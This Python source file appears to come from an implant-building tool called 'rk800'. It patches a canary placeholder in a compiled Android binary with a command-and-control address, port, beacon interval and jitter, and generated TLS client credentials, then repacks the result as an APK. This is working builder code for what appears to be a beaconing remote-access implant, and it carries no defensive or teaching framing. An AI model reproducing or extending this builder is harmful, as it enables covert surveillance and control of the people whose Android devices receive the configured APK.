from rk800.tls_cert import CertManager
from rk800.apk_repack import APKRepack
import argparse
from pathlib import Path
import struct


class Configure:
    CLIENT_CANARY = b"\x41\x39\x31\x54\x21\xff\x3d\xc1\x7a\x45\x1b\x4e\x31\x5d\x36\xc1"
    CLIENT_FORMAT = "!HQQQ256s256s1024s1024s"
    SEC_IN_MIN = 60

    def __init__(self, binary_path: Path):
        self.binary_path = binary_path
        self.cert_manager = CertManager()

    def _pack_client_config(self, args: argparse.Namespace) -> bytes:

        beacon_interval_seconds = args.beacon_interval * self.SEC_IN_MIN
        beacon_jitter_seconds = args.beacon_jitter * self.SEC_IN_MIN

        client_certs = self.cert_manager.generate_client_cert()

        return struct.pack(
            self.CLIENT_FORMAT,
            args.port,
            beacon_interval_seconds,
            beacon_jitter_seconds,
            args.connection_weight,
            args.address.encode("utf-8"),
            client_certs["client_key"].encode("utf-8"),
            client_certs["client_cert"].encode("utf-8"),
            client_certs["ca_cert"].encode("utf-8"),
        )

    def write_configured_binary(
        self, output_path: Path, args: argparse.Namespace = None
    ) -> None:
        with open(self.binary_path, "rb") as binary_file:
            data = bytearray(binary_file.read())

        if args and hasattr(args, "beacon_interval"):
            canary_index = data.find(self.CLIENT_CANARY)
            if canary_index != -1:
                packed_config = self._pack_client_config(args)
                data[canary_index : canary_index + len(packed_config)] = packed_config

        is_64 = "aarch64" in str(self.binary_path)
        apk_bytes = APKRepack.repack(data, is_64)

        with open(output_path, "wb") as output_file:
            output_file.write(apk_bytes)

        print(f"APK written to {output_path.absolute()}")
